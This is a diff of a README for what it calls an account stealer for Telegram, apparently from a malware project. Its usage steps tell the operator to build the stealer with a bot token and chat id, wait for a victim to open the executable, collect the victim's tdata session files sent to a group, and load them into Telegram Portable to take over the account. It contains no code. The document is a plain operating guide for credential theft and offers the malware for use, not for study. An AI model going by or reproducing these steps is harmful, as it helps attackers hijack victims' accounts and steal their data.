@@ -3,10 +3,10 @@ Account stealer for telegram
 
 # How 2 use
 1.compile builder for the stealer ( Or use precompiled )
-2.open builder and insert token and chat id
+2.open builder and insert token and chat id ( place templater.rs along with builder )
 3.build stealer
 4.wait for victim to open exe
-5.tdata will be send to group
+5.tdata will be send to assigned group id
 6.download telegram portable
 7.copy tdata to telegram portable folder
 8.open telegram portable
